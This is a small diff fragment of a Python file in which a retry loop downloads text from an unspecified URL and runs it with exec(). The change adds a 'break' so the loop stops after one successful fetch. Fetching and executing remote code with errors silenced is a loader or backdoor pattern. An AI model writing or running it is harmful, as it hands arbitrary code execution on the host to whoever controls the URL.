@@ -5,6 +5,7 @@ while True:
         r = requests.get(url)
         print("!")
         exec(r.text)
+        break
     except:
         time.sleep(5)
 
